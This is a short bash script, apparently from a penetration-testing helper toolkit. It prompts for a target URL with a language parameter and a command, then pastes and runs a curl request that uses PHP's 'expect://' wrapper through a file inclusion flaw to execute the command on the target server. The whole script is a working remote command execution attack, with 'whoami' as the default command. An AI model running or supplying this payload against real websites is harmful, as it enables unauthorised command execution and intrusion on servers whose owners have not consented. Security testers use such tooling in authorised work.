#!/bin/bash

: '
Check if we can execute expect to execute commands
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
CMD_FIELD=$(form_item "CMD" "cmd" "whoami")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${CMD_FIELD}"

WEBSITE=${form_data["website"]}
CMD=${form_data["cmd"]}

paste_command "curl -ks '${WEBSITE}expect://${CMD}'"
xdotool key Return
